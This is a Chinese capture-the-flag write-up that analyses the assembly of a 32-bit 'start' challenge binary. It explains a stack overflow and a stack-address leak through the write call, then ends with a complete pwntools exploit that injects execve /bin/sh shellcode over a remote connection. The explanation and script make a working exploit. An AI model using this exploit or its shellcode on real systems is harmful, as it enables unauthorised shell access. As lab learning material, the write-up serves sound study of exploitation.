![](image\start0.png)

ida打开第一眼我是懵的，以为是程序出错了。

但是虚拟机里面这个程序可运行，看来就是要分析汇编代码了。

exit函数是正常的，只有这个start函数。start上来就把栈地址放到了栈上，然后是返回地址，之后是要输出的数据。

xor这个汇编指令表示异或，这里是用来清理寄存器的。就不用管了。

之后的三个push压入的是提示信息。然后就是进入函数调用了。

看见旁边的地址很明显是32位的，下面的汇编指令里有int 0x80。这个是32位的系统调用命令相当于64位的syscall。

可以看到start函数一共用了两次系统调用，一次是write，一次是read。调用write之前利用寄存器传入了所需的参数。这里注意系统调用是利用寄存器传参的，跟普通函数调用时利用栈不一样。

压入的数据作用ida也给出了，第一个是addr，传入的是esp就是压完提示信息之后的栈顶。

第二个是len，就是长度0x14，刚好对应提示符的字节数。

第三个是fd，表示标准输出。

read就类比分析。

这里的汇编指令就可以写成类似的c语言

```
char addr[]=“提示符”
write（1，0x14，addr）
read（3，0x3c，addr）
```

read函数很明显的栈溢出。由于是start函数所以这里没有保存ebp。

这个程序任何防护都没开，也就是说我们可以利用shellcode。

但是read是往栈上输入的数据。也就是说我们要得到栈地址。整个start运行之中栈上保存栈地址的地方只有一个就是最初压入的esp。

但是要怎样才能让write去读取到这个栈位置呢？

在跳转函数之前esp被调整到了返回地址的位置，write函数读取的地址是通过指令

```
mov     ecx, esp
```

也就是说这个write读取的不是一个固定的地址，而是esp的地址。

利用read的栈溢出修改返回地址到write函数然后由于此时esp已经指向最初esp保存的位置，读取0x14就能泄露出最初esp的值。

然后程序就执行到了read函数，由于read函数跟write函数一样是往esp指向的位置写入，所以此时只需要覆盖然后操纵返回地址到shellcode储存的位置就行了。

这里直接就给脚本了。

```
from pwn import *

context.arch = 'i386'
r=remote('node5.buuoj.cn',25745)
#r = process('./start')
payload=0x14*b'a'+p32(0x8048087)
r.sendafter(b':',payload)
addr = u32(r.recv(4)) + 0x14
print(addr)
shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov al,0xb;int 0x80')
payload1 = b'a' * 20 + p32(addr) + shellcode
r.send(payload1)
r.interactive()
```

